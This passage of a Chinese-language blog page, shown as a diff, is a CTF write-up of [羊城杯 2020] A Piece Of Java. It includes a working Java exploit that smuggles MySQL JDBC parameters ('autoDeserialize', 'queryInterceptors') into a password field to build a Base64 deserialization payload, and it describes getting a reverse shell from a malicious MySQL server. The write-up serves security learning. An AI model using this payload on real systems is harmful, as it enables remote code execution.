+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gdufs.challenge.web.invocation.InfoInvocationHandler</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gdufs.challenge.web.model.DatabaseInfo</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">gdufs.challenge.web.model.Info</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">JDBC</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span>  <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">DatabaseInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DatabaseInfo</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="o">.</span><span class="na">setHost</span><span class="o">(</span><span class="s">&#34;IP&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="o">.</span><span class="na">setPort</span><span class="o">(</span><span class="s">&#34;3306&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="o">.</span><span class="na">setUsername</span><span class="o">(</span><span class="s">&#34;Cc5&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">info</span><span class="o">.</span><span class="na">setPassword</span><span class="o">(</span><span class="s">&#34;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">InfoInvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InfoInvocationHandler</span><span class="o">(</span><span class="n">info</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Info</span> <span class="n">proxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Info</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">info</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">info</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getInterfaces</span><span class="o">(),</span><span class="n">handler</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span>  <span class="n">outputStream</span><span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">())));</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>这里要注意用jd-gui反编译导出文件，再导入自己项目后，要调整下包名和路径，gdufs.challenge.web不能直接改名，而是要层层新建，否则产生的字节码反序列化会找不到包，返回&quot;Hello,null&quot;。(哭了，java题还是调的太少了)</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003-3.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003-3.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>生成了payload打一下data</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>自己vps起的恶意mysql开始发包</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003-1.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003-1.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<p>监听的端口弹回shell</p>
+<p><figure 
+	>
+	<a href="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003-2.png" >
+		<img src="https://cdn.jsdelivr.net/gh/Kleinor/blog_img/2023/07/18/20230718205003-2.png"
+			
+			
+			
+			loading="lazy"
+			>
+	</a>
+	
+</figure></p>
+<h2 id="展望">展望</h2>
+<p>  既然Mysql可以通过一些参数的恶意利用进行JDBC反序列化攻击，其他数据库是否也可以，答案是肯定的;</p>
+<p>  找到了一篇PostgreSQL JDBC Driver RCE（CVE-2022-21724）与任意文件写入漏洞利用：</p>
+<p><a class="link" href="https://forum.butian.net/share/1339"  target="_blank" rel="noopener"
+    >https://forum.butian.net/share/1339</a>，感兴趣的可以看看，之后有机会结合实战进一步分析吧。</p>
+<h2 id="参考资料">参考资料</h2>
+<p>[1] <a class="link" href="https://tttang.com/archive/1877/"  target="_blank" rel="noopener"
+    >https://tttang.com/archive/1877/</a></p>
+<p>[2] <a class="link" href="https://tttang.com/archive/1769/"  target="_blank" rel="noopener"
+    >https://tttang.com/archive/1769/</a></p>
+<p>[3] <a class="link" href="https://zhzhdoai.github.io/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFEasy-Java%E9%A2%98%E8%A7%A3/"  target="_blank" rel="noopener"
+    >https://zhzhdoai.github.io/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AFEasy-Java%E9%A2%98%E8%A7%A3/</a></p>
+<p>[4] <a class="link" href="https://wustzhb.github.io/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java%29/index.html"  target="_blank" rel="noopener"
+    >https://wustzhb.github.io/2023/04/18/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E6%9D%A5%E7%9C%8BJDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020%5DA-Piece-Of-Java%29/index.html</a></p>
+<p>[5] <a class="link" href="http://www.bmth666.cn/bmth_blog/2022/03/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJDBC%E9%93%BE/"  target="_blank" rel="noopener"
+    >http://www.bmth666.cn/bmth_blog/2022/03/16/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJDBC%E9%93%BE/</a></p>
+<p>[6] <a class="link" href="https://www.cnblogs.com/kingbridge/articles/15801116.html"  target="_blank" rel="noopener"
+    >https://www.cnblogs.com/kingbridge/articles/15801116.html</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/java/">Java</a>
+        
+            <a href="/tags/web/">Web</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="">
+    <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bjackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JAVA入门到放弃系列之Jackson反序列化(一)</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Btemplatesimpl%E6%B3%A8%E5%85%A5fastjson%E5%86%85%E5%AD%98%E9%A9%AC/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JAVA入门到放弃系列之TemplatesImpl注入Fastjson内存马</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="">
+    <a href="/p/java%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%B3%BB%E5%88%97%E4%B9%8Bfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%80/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JAVA入门到放弃系列之Fastjson反序列化(一)</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2021 - 
+        
+        2023 Kleinor
+    </section>
+    
+    <section class="powerby">
+         <br />
+        
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#jdbc简介">JDBC简介</a></li>
+    <li><a href="#mysql-jdbc-漏洞成因">MySQL JDBC 漏洞成因</a></li>
+    <li><a href="#羊城杯-2020a-piece-of-java">[羊城杯 2020]A Piece Of Java</a></li>
+    <li><a href="#展望">展望</a></li>
+    <li><a href="#参考资料">参考资料</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+
+</script>
+
+<a href="#" id="back-to-top" title="返回顶部"></a>
+
+
+<style>
+  #back-to-top {
+    display: none;
+    position: fixed;
+    bottom: 20px;
+    right: 55px;
+    width: 55px;
+    height: 55px;
+    border-radius: 7px;
+    background-color: rgb(246, 241, 241);
+    box-shadow: var(--shadow-l2);
+    font-size: 30px;
+    text-align: center;
+    line-height: 50px;
+    cursor: pointer;
+  }
+
+  #back-to-top:before {
+    content: ' ';
+    display: inline-block;
+    position: relative;
+    top: 0;
+    transform: rotate(135deg);
+    height: 10px;
+    width: 10px;
+    border-width: 0 0 2px 2px;
+    border-color: var(--back-to-top-color);
+    border-style: solid;
+  }
+
+  #back-to-top:hover:before {
+    border-color: #2674e0;
+  }
+
+   
+  @media screen and (max-width: 768px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 20px;
+      width: 40px;
+      height: 40px;
+      font-size: 10px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1024px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 40px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1280px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 55px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1536px) {
+    #back-to-top {
+      visibility: hidden;
+    }
+  }
+</style>
+
+
+<script>
+  function backToTop() {
+    document.documentElement.scrollIntoView({
+      behavior: 'smooth',
+    })
+  }
+
+  window.onload = function () {
+    let scrollTop =
+      this.document.documentElement.scrollTop || this.document.body.scrollTop
+    let totopBtn = this.document.getElementById('back-to-top')
+    if (scrollTop > 0) {
+      totopBtn.style.display = 'inline'
+    } else {
+      totopBtn.style.display = 'none'
+    }
+  }
+
+  window.onscroll = function () {
+    let scrollTop =
+      this.document.documentElement.scrollTop || this.document.body.scrollTop
+    let totopBtn = this.document.getElementById('back-to-top')
+    if (scrollTop < 200) {
+      totopBtn.style.display = 'none'
+    } else {
+      totopBtn.style.display = 'inline'
+      totopBtn.addEventListener('click', backToTop, false)
+    }
+  }
+</script>
+    </body>
+</html>
